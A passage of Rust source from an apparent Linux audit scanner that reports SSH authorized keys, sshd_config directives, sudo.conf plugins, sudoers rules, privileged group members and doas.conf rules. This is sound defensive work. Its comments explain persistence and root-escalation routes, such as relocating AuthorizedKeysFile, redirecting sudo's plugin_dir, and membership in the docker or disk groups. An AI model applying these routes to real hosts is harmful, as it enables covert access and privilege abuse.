    enabled: Enablement,
    scope: Option<&str>,
) {
    let Some(bytes) = cx.read(rel) else { return };
    for line in bytes.split(|b| *b == b'\n') {
        let line = trim(line);
        if line.is_empty() || line[0] == b'#' {
            continue;
        }
        let Some(k) = parse_key_line(line) else { continue };
        let (fp, decoded) = fingerprint(k.blob);

        let mut e = cx.entry(Kind::SshAuthorizedKey, rel, fp);
        e.trigger = Trigger::Login;
        e.enabled = enabled;
        e.principal = Some(user.to_string());
        e.note("ssh_mechanism", "authorized-key");
        if enabled == Enablement::Disabled {
            e.note("not_read", "AuthorizedKeysFile names other files");
        }
        if let Some(m) = scope {
            e.note("match", m);
        }
        e.note("key_type", lossy(k.keytype));
        if !k.comment.is_empty() {
            e.note("comment", lossy(k.comment));
        }
        if !decoded {
            e.note("key_blob_unparsed", "true");
        }
        if let Some(opts) = k.options {
            e.note("options", lossy(opts));
            for (name, value) in parse_options(opts) {
                let name = lossy(&name).to_ascii_lowercase();
                match (name.as_str(), value) {
                    ("command", Some(v)) => {
                        e.target_path = first_path(&v);
                        e.command = Some(v);
                    }
                    ("environment", Some(v)) => match split_once(&v, b'=') {
                        Some((k, val)) => e.note(&format!("env.{}", lossy(k)), lossy(val)),
                        None => e.append_note("opt.environment", lossy(&v)),
                    },
                    (_, Some(v)) => e.append_note(&format!("opt.{name}"), lossy(&v)),
                    (_, None) => e.append_note(&format!("opt.{name}"), "true"),
                }
            }
        }
        flag_non_utf8(&mut e, line);
        out.push(e);
    }
}

/// `/etc/ssh/sshrc` and `~/.ssh/rc`: sshd runs these on every login, so their
/// presence is the entry. The command is the script itself.
fn login_script(cx: &mut Ctx, out: &mut Vec<Entry>, rel: &Path, name: &str, user: Option<&str>) {
    if !cx.root.exists(rel) {
        return;
    }
    let mut e = cx.entry(Kind::SshAuthorizedKey, rel, name);
    e.trigger = Trigger::Login;
    e.enabled = Enablement::Enabled;
    e.principal = user.map(str::to_string);
    e.target_path = Some(cx.root.abs(rel));
    e.note("ssh_mechanism", "login-script");
    out.push(e);
}

/// `~/.ssh/environment` is inert unless sshd carries PermitUserEnvironment,
/// which is why the file is reported with its enablement unresolved.
fn user_environment(cx: &mut Ctx, out: &mut Vec<Entry>, rel: &Path, user: &str) {
    let Some(bytes) = cx.read(rel) else { return };
    let mut e = cx.entry(Kind::SshAuthorizedKey, rel, "ssh-environment");
    e.trigger = Trigger::Login;
    e.enabled = Enablement::Unknown;
    e.principal = Some(user.to_string());
    e.note("ssh_mechanism", "user-environment");
    e.note("depends_on", "PermitUserEnvironment");
    for line in bytes.split(|b| *b == b'\n') {
        let line = trim(line);
        if line.is_empty() || line[0] == b'#' {
            continue;
        }
        if let Some((k, v)) = split_once(line, b'=') {
            e.note(&format!("env.{}", lossy(trim(k))), lossy(trim(v)));
        }
    }
    flag_non_utf8(&mut e, &bytes);
    out.push(e);
}

/// Keyword and value. sshd_config accepts whitespace or `=` as the separator,
/// matches keywords case-insensitively, and treats `#` as a comment only at
/// the start of a line — a trailing `# note` is part of the value.
fn sshd_kv(line: &[u8]) -> Option<(&[u8], &[u8])> {
    let line = trim(line);
    if line.is_empty() || line[0] == b'#' {
        return None;
    }
    let mut i = 0;
    while i < line.len() && !is_ws(line[i]) && line[i] != b'=' {
        i += 1;
    }
    let keyword = &line[..i];
    while i < line.len() && is_ws(line[i]) {
        i += 1;
    }
    if line.get(i) == Some(&b'=') {
        i += 1;
        while i < line.len() && is_ws(line[i]) {
            i += 1;
        }
    }
    Some((keyword, &line[i..]))
}

/// An include path resolved root-relative: absolute means relative to the scan
/// root, bare means relative to `base`.
fn sshd_config_file(
    cx: &mut Ctx,
    out: &mut Vec<Entry>,
    rel: &Path,
    outer_match: Option<&str>,
    depth: u32,
    live: bool,
    seen: &mut BTreeSet<PathBuf>,
    keys: &mut KeyFiles,
) {
    if !seen.insert(rel.to_path_buf()) {
        return;
    }
    let Some(bytes) = cx.read(rel) else { return };
    let mut current: Option<String> = outer_match.map(str::to_string);

    for line in bytes.split(|b| *b == b'\n') {
        let Some((keyword, value)) = sshd_kv(line) else { continue };
        let lower = lossy(keyword).to_ascii_lowercase();
        let canonical = match lower.as_str() {
            "match" => {
                current = Some(lossy(value));
                continue;
            }
            "forcecommand" => "ForceCommand",
            "authorizedkeyscommand" => "AuthorizedKeysCommand",
            "authorizedprincipalscommand" => "AuthorizedPrincipalsCommand",
            "authorizedkeysfile" => "AuthorizedKeysFile",
            "trustedusercakeys" => "TrustedUserCAKeys",
            "permituserenvironment" => "PermitUserEnvironment",
            "include" => "Include",
            "setenv" => "SetEnv",
            _ => continue,
        };
        if canonical == "PermitUserEnvironment" && (value.is_empty() || eqi(value, "no")) {
            continue;
        }

        let scope = current.clone().unwrap_or_else(|| "(global)".to_string());
        let name = match &current {
            Some(m) => format!("{canonical}@{m}"),
            None => canonical.to_string(),
        };
        let mut e = cx.entry(Kind::SshAuthorizedKey, rel, name);
        e.trigger = Trigger::Login;
        e.enabled = if live { Enablement::Enabled } else { Enablement::Disabled };
        if !live {
            e.note("not_included", "no Include line reaches this file");
        }
        e.note("ssh_mechanism", "sshd_config");
        e.note("directive", canonical);
        e.note("match", scope);
        if let Some(m) = &current {
            let w = words(m.as_bytes());
            if w.len() >= 2 && eqi(w[0], "user") {
                e.principal = Some(lossy(w[1]));
            }
        }
        match canonical {
            "ForceCommand" | "AuthorizedKeysCommand" | "AuthorizedPrincipalsCommand" => {
                e.target_path = first_path(value);
                e.command = Some(value.to_vec());
            }
            // Where keys are read from. Moving it is the persistence step:
            // keys in a file nobody audits log in like any other.
            "AuthorizedKeysFile" => {
                let v = lossy(value);
                e.note("value", v.clone());
                match &current {
                    _ if !live => {}
                    Some(m) => keys.scoped.push((m.clone(), v)),
                    None if keys.global.is_none() => keys.global = Some(v),
                    None => {
                        e.enabled = Enablement::Disabled;
                        e.note("superseded", "sshd takes the first value it obtains");
                    }
                }
            }
            "PermitUserEnvironment" => {
                e.note("value", lossy(value));
            }
            "SetEnv" => {
                for w in words(value) {
                    if let Some((k, v)) = split_once(w, b'=') {
                        e.note(&format!("env.{}", lossy(k)), lossy(v));
                    }
                }
            }
            _ => {
                e.note("value", lossy(value));
                // Include takes a list; the first member is the path.
                e.target_path = words(value).first().map(|w| bpath(w));
            }
        }
        flag_non_utf8(&mut e, line);
        out.push(e);

        // ponytail: Include is followed exactly one level; a second level
        // needs a cycle guard and a depth budget nobody has asked for.
        if canonical == "Include" && depth > 0 && live {
            let here = current.clone();
            for spec in words(value) {
                let rel = include_rel(Path::new("etc/ssh"), spec);
                for target in expand_glob(cx, &rel) {
                    sshd_config_file(cx, out, &target, here.as_deref(), depth - 1, true, seen, keys);
                }
            }
        }
    }
}

// ------------------------------------------------------------------- part C

const SUDO_TAGS: &[&str] = &[
    "NOPASSWD",
    "PASSWD",
    "NOEXEC",
    "EXEC",
    "SETENV",
    "NOSETENV",
    "LOG_INPUT",
    "NOLOG_INPUT",
    "LOG_OUTPUT",
    "NOLOG_OUTPUT",
    "FOLLOW",
    "NOFOLLOW",
    "MAIL",
    "NOMAIL",
    "INTERCEPT",
    "NOINTERCEPT",
];

/// sudo's compiled-in plugin directory, the same on every supported
/// distribution. It ends in a slash because sudo joins it to a relative
/// plugin path by concatenation: with `Path plugin_dir /opt/p`, sudoers.so
/// is loaded from /opt/psudoers.so.
const SUDO_PLUGIN_DIR: &str = "/usr/libexec/sudo/";

/// The Path settings that load or run something: askpass and sesh are
/// programs, intercept and noexec libraries preloaded into commands.
const SUDO_RUNS: [&str; 4] = ["askpass", "sesh", "intercept", "noexec"];

/// /etc/sudo.conf decides which shared objects sudo loads into itself, as
/// root, before it authenticates anyone, and which helpers it runs. Read as
/// sudo reads it (lib/util/sudo_conf.c): the keyword and a Path name match
/// without regard to case, a later Path line replaces an earlier one, and a
/// Path with no value turns its feature off. There is no include.
fn sudo_conf(cx: &mut Ctx, out: &mut Vec<Entry>) {
    let rel = Path::new("etc/sudo.conf");
    let Some(bytes) = cx.read_capped(rel, 64 * 1024) else { return };
    let mut plugins: Vec<(Vec<u8>, Vec<u8>, Vec<u8>)> = Vec::new();
    let mut paths: BTreeMap<String, Vec<u8>> = BTreeMap::new();
    for raw in bytes.split(|b| *b == b'\n') {
        let mut words = raw.split(u8::is_ascii_whitespace).filter(|w| !w.is_empty());
        let Some(keyword) = words.next() else { continue };
        if keyword.eq_ignore_ascii_case(b"plugin") {
            let (Some(symbol), Some(path)) = (words.next(), words.next()) else { continue };
            plugins.push((symbol.to_vec(), path.to_vec(), join_ws(&words.collect::<Vec<_>>())));
        } else if keyword.eq_ignore_ascii_case(b"path") {
            let Some(name) = words.next() else { continue };
            paths.insert(lossy(name).to_ascii_lowercase(), words.next().unwrap_or_default().to_vec());
        }
    }
    let dir = match paths.get("plugin_dir") {
        Some(d) if !d.is_empty() => d.clone(),
        _ => SUDO_PLUGIN_DIR.as_bytes().to_vec(),
    };
    let resolve = |p: &[u8]| if p.starts_with(b"/") { p.to_vec() } else { [dir.as_slice(), p].concat() };

    let entry = |cx: &mut Ctx, name: String, target: Vec<u8>| {
        let mut e = cx.entry(Kind::SudoPlugin, rel, name);
        e.trigger = Trigger::Auth;
        e.enabled = Enablement::Enabled;
        e.principal = Some("root".into());
        e.target_path = Some(bpath(&target));
        if std::str::from_utf8(&target).is_err() {
            e.flag(Flag::EncodingAnomaly);
        }
        e
    };
    for (symbol, path, options) in &plugins {
        let mut e = entry(cx, format!("Plugin {} {}", lossy(symbol), lossy(path)), resolve(path));
        e.note("symbol", lossy(symbol));
        if !options.is_empty() {
            e.note("options", lossy(options));
        }
        out.push(e);
    }
    // With no Plugin line sudo loads its default policy from plugin_dir, so
    // moving the directory alone changes what every sudo loads.
    if plugins.is_empty() && paths.get("plugin_dir").is_some_and(|d| !d.is_empty()) {
        let mut e = entry(cx, "default policy sudoers.so".into(), resolve(b"sudoers.so"));
        e.note("symbol", "sudoers_policy");
        out.push(e);
    }
    for (name, value) in &paths {
        if value.is_empty() {
            continue;
        }
        if name == "plugin_dir" {
            let mut e = entry(cx, "Path plugin_dir".into(), value.clone());
            e.note("path_setting", name.as_str());
            out.push(e);
        } else if SUDO_RUNS.contains(&name.as_str()) {
            // intercept and noexec may name two libraries, one per word size.
            for part in value.split(|b| *b == b':').filter(|p| !p.is_empty()) {
                let mut e = entry(cx, format!("Path {name} {}", lossy(part)), part.to_vec());
                e.note("path_setting", name.as_str());
                out.push(e);
            }
        }
    }
}

/// How deep an include may nest. sudo's own limit is 128; a loop is caught
/// by the set of files already read long before either.
const SUDO_INCLUDE_DEPTH: u32 = 16;

fn sudoers(cx: &mut Ctx, out: &mut Vec<Entry>) {
    let start = out.len();
    let mut seen: BTreeSet<PathBuf> = BTreeSet::new();
    sudoers_file(cx, out, Path::new("etc/sudoers"), SUDO_INCLUDE_DEPTH, false, &mut seen);
    for ent in cx.dir("etc/sudoers.d") {
        if ent.is_dir {
            continue;
        }
        let rel = Path::new("etc/sudoers.d").join(&ent.name);
        sudoers_file(cx, out, &rel, SUDO_INCLUDE_DEPTH - 1, true, &mut seen);
    }
    resolve_sudo_aliases(&mut out[start..]);
}

/// A sudoers alias name: upper-case letters, digits and `_`, starting with
/// a letter.
fn is_alias_name(s: &str) -> bool {
    s.as_bytes().first().is_some_and(u8::is_ascii_uppercase) && s.bytes().all(|b| b.is_ascii_uppercase() || b.is_ascii_digit() || b == b'_')
}

/// Members one expansion may visit. Depth is bounded, but nesting multiplies
/// breadth: forty levels of two references each is 2^40 members, and `visudo`
/// accepts it, so a 930-byte sudoers hung a scan for minutes. A legitimate
/// list has a handful. Past the budget the rest stays as written.
const SUDO_EXPANSION_BUDGET: usize = 2048;

/// A comma-separated list with each alias of `kind` replaced by its
/// members, as sudo resolves it once every file is read: aliases nest, and
/// a negated alias negates each member. Expansion is bounded in depth and
/// in the members it visits, so a cycle, which sudo rejects outright, ends
/// rather than recurses. The flag says whether anything was an alias: a list
/// with none is left as written. `budget` reads zero afterwards if the
/// expansion was cut short.
fn expand_sudo_aliases(aliases: &BTreeMap<(String, String), String>, kind: &str, list: &str, depth: usize, budget: &mut usize) -> (String, bool) {
    let mut changed = false;
    let members: Vec<String> = list
        .split(',')
        .map(|m| {
            let m = m.trim();
            if *budget == 0 {
                return m.to_string();
            }
            *budget -= 1;
            let (neg, name) = match m.strip_prefix('!') {
                Some(n) => (true, n.trim()),
                None => (false, m),
            };
            match aliases.get(&(kind.to_string(), name.to_string())) {
                Some(v) if depth < 16 && is_alias_name(name) => {
                    changed = true;
                    let (inner, _) = expand_sudo_aliases(aliases, kind, v, depth + 1, budget);
                    if neg { inner.split(", ").map(|x| format!("!{x}")).collect::<Vec<_>>().join(", ") } else { inner }
                }
                _ => m.to_string(),
            }
        })
        .collect();
    (members.join(", "), changed)
}

/// Fills each user specification's lists in from the aliases every file
/// defined. Only an alias sudo would read counts: one in a file sudo
/// ignores defines nothing.
fn resolve_sudo_aliases(entries: &mut [Entry]) {
    let mut aliases: BTreeMap<(String, String), String> = BTreeMap::new();
    for e in entries.iter() {
        if e.enabled != Enablement::Enabled {
            continue;
        }
        if let (Some(t), Some(n), Some(v)) = (e.raw.get("alias_type"), e.raw.get("alias_name"), e.raw.get("alias_value")) {
            aliases.insert((t.clone(), n.clone()), v.clone());
        }
    }
    for e in entries.iter_mut() {
        e.note("analysis", "line-level, aliases resolved");
        if aliases.is_empty() || !e.raw.contains_key("commands") {
            continue;
        }
        for (key, kind, resolved_key) in [("commands", "cmnd_alias", "commands_resolved"), ("user_list", "user_alias", "user_list_resolved"), ("host_list", "host_alias", "host_list_resolved")] {
            let Some(list) = e.raw.get(key).cloned() else { continue };
            let mut budget = SUDO_EXPANSION_BUDGET;
            let (resolved, changed) = expand_sudo_aliases(&aliases, kind, &list, 0, &mut budget);
            if budget == 0 {
                e.note("alias_expansion_truncated", format!("{key}: more than {SUDO_EXPANSION_BUDGET} members; the rest is left as written"));
            }
            if changed {
                e.note(resolved_key, resolved.clone());
                if key == "commands" {
                    e.target_path = resolved.split(',').next().and_then(|m| first_path(m.trim().trim_start_matches('!').as_bytes()));
                    e.command = Some(resolved.into_bytes());
                }
            }
        }
        // Runas is `user` or `user:group`, either an alias.
        if let Some(p) = e.principal.clone() {
            let (user, group) = p.split_once(':').map(|(u, g)| (u.trim(), Some(g))).unwrap_or((p.trim(), None));
            let mut budget = SUDO_EXPANSION_BUDGET;
            let (resolved, changed) = expand_sudo_aliases(&aliases, "runas_alias", user, 0, &mut budget);
            if changed {
                e.note("runas_resolved", resolved.clone());
                e.principal = Some(match group {
                    Some(g) => format!("{resolved}:{g}"),
                    None => resolved,
                });
            }
        }
    }
}

/// sudo skips a file in an included directory whose name ends in `~` or holds
/// a dot, so a dropped `evil.conf` is inert and must not read as an active
/// rule.
fn sudo_ignores(rel: &Path) -> bool {
    let Some(name) = rel.file_name() else { return true };
    let name = name.as_encoded_bytes();
    name.is_empty() || name.ends_with(b"~") || name.contains(&b'.')
}

fn sudoers_file(
    cx: &mut Ctx,
    out: &mut Vec<Entry>,
    rel: &Path,
    depth: u32,
    from_dir: bool,
    seen: &mut BTreeSet<PathBuf>,
) {
    if !seen.insert(rel.to_path_buf()) {
        return;
    }
    let Some(bytes) = cx.read(rel) else { return };
    let inert = from_dir && sudo_ignores(rel);

    for line in logical_lines(&bytes) {
        let t = trim(&line);
        if t.is_empty() {
            continue;
        }
        let Some(first) = words(t).into_iter().next() else { continue };
        let lower = lossy(first).to_ascii_lowercase();
        let is_include =
            matches!(lower.as_str(), "#include" | "#includedir" | "@include" | "@includedir");

        // A comment, unless it is an include directive or the `#uid` form of a
        // user name, which is a real user specification.
        if !is_include
            && t[0] == b'#'
            && !t.get(1).is_some_and(|c| c.is_ascii_digit() || *c == b'-')
        {
            continue;
        }

        let mut e = if is_include {
            let Some(spec) = words(t).into_iter().nth(1) else { continue };
            let mut e =
                cx.entry(Kind::Sudoers, rel, format!("include:{}", lossy(spec)));
            e.target_path = Some(bpath(spec));
            e.note("directive", lower.clone());
            if spec.contains(&b'%') {
                e.note("unexpanded", "true");
            }
            finish_sudoers(&mut e, t, inert);
            out.push(e);

            // Includes nest as sudo follows them; `seen` ends a loop.
            if depth > 0 && !spec.contains(&b'%') {
                let base = rel.parent().unwrap_or(Path::new(""));
                let target = include_rel(base, spec);
                if lower.ends_with("dir") {
                    for ent in cx.dir(&target) {
                        if !ent.is_dir {
                            let f = target.join(&ent.name);
                            sudoers_file(cx, out, &f, depth - 1, true, seen);
                        }
                    }
                } else {
                    sudoers_file(cx, out, &target, depth - 1, false, seen);
                }
            }
            continue;
        } else if lower.starts_with("defaults") {
            // Defaults !authenticate is NOPASSWD written another way.
            let mut e = cx.entry(
                Kind::Sudoers,
                rel,
                format!("defaults:{}", short_hash(&normalized(t))),
            );
            e.note("defaults", lossy(t));
            if t.windows(13).any(|w| w == b"!authenticate") {
                e.note("nopasswd_equivalent", "true");
            }
            e
        } else if matches!(
            lower.as_str(),
            "user_alias" | "cmnd_alias" | "host_alias" | "runas_alias"
        ) {
            // Recorded here; resolved into the user specifications once every
            // file is read, as sudo does it.
            let (lhs, rhs) = split_once(t, b'=').unwrap_or((t, b""));
            let alias = words(lhs).into_iter().nth(1).unwrap_or(b"");
            let mut e = cx.entry(
                Kind::Sudoers,
                rel,
                format!("{lower}:{}", lossy(alias)),
            );
            e.note("alias_type", lower.clone());
            e.note("alias_name", lossy(alias));
            e.note("alias_value", lossy(trim(rhs)));
            e
        } else if let Some((lhs, rhs)) = split_once(t, b'=') {
            let lw = words(lhs);
            if lw.is_empty() {
                continue;
            }
            let (users, hosts) = lw.split_at(lw.len().saturating_sub(1));
            let users = if users.is_empty() { &lw[..] } else { users };

            let mut r = trim(rhs);
            let mut runas = None;
            if r.first() == Some(&b'(') {
                if let Some(p) = r.iter().position(|b| *b == b')') {
                    runas = Some(&r[1..p]);
                    r = trim(&r[p + 1..]);
                }
            }
            let mut tags: Vec<String> = Vec::new();
            while let Some(w) = words(r).into_iter().next() {
                let Some(bare) = w.strip_suffix(b":") else { break };
                if !SUDO_TAGS.iter().any(|t| eqi(bare, t)) {
                    break;
                }
                tags.push(lossy(bare));
                r = trim(&r[w.len()..]);
            }

            let mut e = cx.entry(
                Kind::Sudoers,
                rel,
                format!("{}:{}", lossy(users[0]), short_hash(&normalized(t))),
            );
            e.note("user_list", lossy(&join_ws(users)));
            e.note("host_list", lossy(&join_ws(hosts)));
            e.note("commands", lossy(r));
            if !tags.is_empty() {
                e.note("tags", tags.join(","));
            }
            if rhs.windows(8).any(|w| w == b"NOPASSWD") {
                e.note("nopasswd", "true");
            }
            e.principal = Some(match runas {
                Some(x) => lossy(trim(x)),
                None => "root".to_string(),
            });
            e.note("runas_explicit", if runas.is_some() { "true" } else { "false" });
            if !r.is_empty() {
                // The command field is a list; the path it resolves to is the
                // first member of it, not the first word with its comma.
                e.target_path = r.split(|b| *b == b',').next().and_then(first_path);
                e.command = Some(r.to_vec());
            }
            e
        } else {
            continue;
        };

        finish_sudoers(&mut e, t, inert);
        out.push(e);
    }
}

fn finish_sudoers(e: &mut Entry, line: &[u8], inert: bool) {
    e.trigger = Trigger::Always;
    // The spec ships a line scan, not a resolved policy. Saying so on every
    // entry is what stops the output being read as one.
    e.note("analysis", "line-level, aliases resolved");
    e.note("line", lossy(line));
    e.enabled = if inert {
        e.note("ignored_by_sudo", "filename holds a dot or ends in ~");
        Enablement::Disabled
    } else {
        Enablement::Enabled
    };
    flag_non_utf8(e, line);
}

// -------------------------------------------------------------------- groups

/// Groups whose members can become root or read what only root reads,
/// and how. Membership is /etc/group's member list, /etc/gshadow's, and
/// each account's primary group in passwd.
const RIGHTS_GROUPS: [(&str, &str); 13] = [
    ("root", "root's own group"),
    ("wheel", "sudo's default %wheel rule on Fedora"),
    ("sudo", "sudo's default %sudo rule on Debian"),
    ("admin", "the older Debian %admin rule"),
    ("adm", "reads every log"),
    ("shadow", "reads /etc/shadow"),
    ("disk", "reads and writes every block device"),
    ("docker", "root on the host through the Docker daemon"),
    ("lxd", "root on the host through LXD"),
    ("libvirt", "root on the host through libvirtd"),
    ("kvm", "/dev/kvm"),
    ("systemd-journal", "reads every journal"),
    ("staff", "writes /usr/local and /home on Debian"),
];

/// A colon-separated database's rows.
fn colon_rows(bytes: &[u8]) -> Vec<Vec<String>> {
    String::from_utf8_lossy(bytes).lines().filter(|l| !l.starts_with('#') && !l.trim().is_empty()).map(|l| l.split(':').map(str::to_string).collect()).collect()
}

fn groups(cx: &mut Ctx, out: &mut Vec<Entry>) {
    let rel = Path::new("etc/group");
    let Some(group) = cx.read(rel) else { return };
    let mut members: BTreeMap<String, BTreeSet<String>> = BTreeMap::new();
    let mut gids: BTreeMap<String, String> = BTreeMap::new();
    for row in colon_rows(&group) {
        let (Some(name), Some(gid)) = (row.first(), row.get(2)) else { continue };
        gids.insert(gid.clone(), name.clone());
        let set = members.entry(name.clone()).or_default();
        set.extend(row.get(3).map(|m| m.split(',').filter(|u| !u.is_empty()).map(str::to_string)).into_iter().flatten());
    }
    if let Some(gshadow) = cx.read("etc/gshadow") {
        for row in colon_rows(&gshadow) {
            if let (Some(name), Some(m)) = (row.first(), row.get(3)) {
                members.entry(name.clone()).or_default().extend(m.split(',').filter(|u| !u.is_empty()).map(str::to_string));
            }
        }
    }
    // Each local account's shell: one that cannot log in (nologin, false,
    // and the setup package's halt, shutdown and sync, whose primary group
    // is root on Fedora) holds no right anyone can use. A member with no
    // local account may come from a directory and is kept.
    let mut shells: BTreeMap<String, String> = BTreeMap::new();
    if let Some(passwd) = cx.read("etc/passwd") {
        for row in colon_rows(&passwd) {
            let Some(user) = row.first() else { continue };
            shells.insert(user.clone(), row.get(6).cloned().unwrap_or_default());
            if let Some(g) = row.get(3).and_then(|gid| gids.get(gid)) {
                members.entry(g.clone()).or_default().insert(user.clone());
            }
        }
    }
    let no_login = |user: &str| {
        shells.get(user).is_some_and(|sh| {
            matches!(sh.rsplit('/').next().unwrap_or(sh), "nologin" | "false" | "halt" | "shutdown" | "sync" | "reboot" | "poweroff")
        })
    };
    for (g, why) in RIGHTS_GROUPS {
        let Some(set) = members.get(g) else { continue };
        for user in set {
            // root in root's group, and a system group's own service
            // account, are how the groups are made.
            if user == "root" || user == g || no_login(user) {
                continue;
            }
            let mut e = cx.entry(Kind::GroupMember, rel, format!("{g}:{user}"));
            e.trigger = Trigger::Always;
            e.enabled = Enablement::Enabled;
            e.principal = Some(user.clone());
            e.note("group", g);
            e.note("grants", why);
            e.note("target_unverifiable", "a right, not a program");
            if !shells.contains_key(user.as_str()) {
                e.note("account", "no local account; a directory's, or none");
            }
            out.push(e);
        }
    }
}

// ---------------------------------------------------------------------- doas

#[derive(Debug, PartialEq)]
enum DoasTok {
    Newline,
    Open,
    Close,
    /// A word, and whether a quote or a continuation inside it stops it
    /// being read as a keyword, as it does in doas.
    Word(Vec<u8>, bool),
}

/// doas.conf split into tokens by OpenDoas's own lexer (parse.y, yylex):
/// `#` comments to the end of the line with no continuation, `"` quotes
/// without being kept, a backslash escapes the next byte and joins a line it
/// ends, and `{`, `}` and newline stand alone. The errors it would report,
/// which make doas refuse the whole file, come back beside the tokens.
fn doas_tokens(s: &[u8]) -> (Vec<(DoasTok, usize)>, Vec<String>) {
    let mut toks = Vec::new();
    let mut errs = Vec::new();
    let mut line = 1;
    let mut i = 0;
    // A continuation that ends in whitespace yields no word, and doas goes
    // back for the next one without clearing the flag the continuation set:
    // `permit \` then `nopass alice` on the next line makes `nopass` the
    // identity, not an option.
    let mut carry = false;
    loop {
        while matches!(s.get(i), Some(b' ' | b'\t')) {
            i += 1;
        }
        match s.get(i) {
            None => break,
            Some(b'\n') => {
                carry = false;
                toks.push((DoasTok::Newline, line));
                line += 1;
                i += 1;
                continue;
            }
            Some(b'{') => {
                carry = false;
                toks.push((DoasTok::Open, line));
                i += 1;
                continue;
            }
            Some(b'}') => {
                carry = false;
                toks.push((DoasTok::Close, line));
                i += 1;
                continue;
            }
            Some(b'#') => {
                carry = false;
                match s[i..].iter().position(|b| *b == b'\n') {
                    Some(n) => i += n,
                    None => break,
                }
                continue;
            }
            Some(_) => {}
        }
        let start_line = line;
        let (mut word, mut quotes, mut escape, mut nonkw, mut quoted) = (Vec::new(), false, false, carry, false);
        while let Some(&c) = s.get(i) {
            match c {
                0 => {
                    errs.push(format!("line {line}: NUL"));
                    escape = false;
                    i += 1;
                    continue;
                }
                b'\\' => {
                    escape = !escape;
                    if escape {
                        i += 1;
                        continue;
                    }
                }
                b'\n' => {
                    if quotes {
                        errs.push(format!("line {line}: unterminated quotes"));
                    }
                    if escape {
                        nonkw = true;
                        escape = false;
                        line += 1;
                        i += 1;
                        continue;
                    }
                    break;
                }
                b'{' | b'}' | b'#' | b' ' | b'\t' if !escape && !quotes => break,
                b'"' if !escape => {
                    quotes = !quotes;
                    if quotes {
                        nonkw = true;
                        quoted = true;
                    }
                    i += 1;
                    continue;
                }
                _ => {}
            }
            word.push(c);
            // doas reads a word into 1024 bytes and starts it again when
            // they fill.
            if word.len() == 1024 {
                errs.push(format!("line {line}: too long line"));
                word.clear();
            }
            escape = false;
            i += 1;
        }
        if i == s.len() {
            if escape {
                errs.push(format!("line {line}: unterminated escape"));
            }
            if quotes {
                errs.push(format!("line {line}: unterminated quotes"));
            }
        }
        // An empty word is a token only when it was quoted: `args ""`.
        if !word.is_empty() || quoted {
            toks.push((DoasTok::Word(word, nonkw), start_line));
            carry = false;
        } else {
            carry = nonkw;
        }
    }
    (toks, errs)
}

#[derive(Debug, Default)]
struct DoasRule {
    line: usize,
    permit: bool,
    options: Vec<&'static str>,
    setenv: Vec<Vec<u8>>,
    ident: Vec<u8>,
    target: Option<Vec<u8>>,
    cmd: Option<Vec<u8>>,
    /// `None` is any arguments; `Some` of an empty list is none.
    args: Option<Vec<Vec<u8>>>,
    words: Vec<Vec<u8>>,
}

/// The rules doas.conf holds, parsed by OpenDoas's grammar:
///
/// ```text
/// rule    := ("permit" option* | "deny") ident ["as" word] ["cmd" word ["args" word*]] "\n"
/// option  := "nopass" | "nolog" | "persist" | "keepenv" | "setenv" "{" word* "}"
/// ```
///
/// A line that does not parse is skipped to its newline, as yacc's error
/// rule does, and reported; so is a rule without its newline at the end of
/// the file, which doas also rejects.
fn doas_rules(s: &[u8]) -> (Vec<DoasRule>, Vec<String>) {
    let (toks, mut errs) = doas_tokens(s);
    let kw = |t: Option<&(DoasTok, usize)>, k: &str| matches!(t, Some((DoasTok::Word(w, false), _)) if w == k.as_bytes());
    let word = |t: Option<&(DoasTok, usize)>| match t {
        Some((DoasTok::Word(w, nonkw), _)) if *nonkw || !DOAS_KEYWORDS.iter().any(|k| w == k.as_bytes()) => Some(w.clone()),
        _ => None,
    };
    let mut rules = Vec::new();
    let mut i = 0;
    while i < toks.len() {
        if toks[i].0 == DoasTok::Newline {
            i += 1;
            continue;
        }
        let line = toks[i].1;
        let mut r = DoasRule { line, ..Default::default() };
        let parsed = (|| {
            let mut j = i;
            let at = |j: usize| toks.get(j);
            if kw(at(j), "permit") {
                r.permit = true;
                j += 1;
                while let Some((DoasTok::Word(w, false), _)) = at(j) {
                    let Some(o) = ["nopass", "nolog", "persist", "keepenv"].into_iter().find(|o| w == o.as_bytes()) else {
                        if w != b"setenv" {
                            break;
                        }
                        if r.options.contains(&"setenv") {
                            return Err("two setenv sections");
                        }
                        r.options.push("setenv");
                        if at(j + 1).map(|t| &t.0) != Some(&DoasTok::Open) {
                            return Err("setenv without {");
                        }
                        j += 2;
                        while let Some(w) = word(at(j)) {
                            r.setenv.push(w);
                            j += 1;
                        }
                        if at(j).map(|t| &t.0) != Some(&DoasTok::Close) {
                            return Err("setenv without }");
                        }
                        j += 1;
                        continue;
                    };
                    if !r.options.contains(&o) {
                        r.options.push(o);
                    }
                    j += 1;
                }
                if r.options.contains(&"nopass") && r.options.contains(&"persist") {
                    return Err("can't combine nopass and persist");
                }
            } else if kw(at(j), "deny") {
                j += 1;
            } else {
                return Err("syntax error");
            }
            r.ident = word(at(j)).ok_or("syntax error")?;
            j += 1;
            if kw(at(j), "as") {
                r.target = Some(word(at(j + 1)).ok_or("syntax error")?);
                j += 2;
            }
            if kw(at(j), "cmd") {
                r.cmd = Some(word(at(j + 1)).ok_or("syntax error")?);
                j += 2;
                if kw(at(j), "args") {
                    j += 1;
                    let mut args = Vec::new();
                    while let Some(w) = word(at(j)) {
                        args.push(w);
                        j += 1;
                    }
                    r.args = Some(args);
                }
            }
            match at(j) {
                Some((DoasTok::Newline, _)) => Ok(j + 1),
                None => Err("no newline at the end of the file"),
                _ => Err("syntax error"),
            }
        })();
        match parsed {
            Ok(next) => {
                r.words = toks[i..next - 1]
                    .iter()
                    .map(|(t, _)| match t {
                        DoasTok::Word(w, _) => w.clone(),
                        DoasTok::Open => b"{".to_vec(),
                        DoasTok::Close => b"}".to_vec(),
                        DoasTok::Newline => Vec::new(),
                    })
                    .collect();
                rules.push(r);
                i = next;
            }
            Err(why) => {
                errs.push(format!("line {line}: {why}"));
                while i < toks.len() && toks[i].0 != DoasTok::Newline {
                    i += 1;
                }
            }
        }
    }
    (rules, errs)
}

const DOAS_KEYWORDS: [&str; 10] = ["deny", "permit", "as", "cmd", "args", "nopass", "nolog", "persist", "keepenv", "setenv"];

/// /etc/doas.conf, the path OpenDoas is built with on every distribution
/// that packages it. One entry per rule. doas takes the last rule that
/// matches, so a permit can be undone by a later deny; like sudoers this is
/// a line scan, not a resolved policy. doas refuses to run at all when the
/// file is writable by group or other, is not owned by root, or does not
/// parse, and those are noted: the first two leave every rule inert.
fn doas(cx: &mut Ctx, out: &mut Vec<Entry>) {
    let rel = Path::new("etc/doas.conf");
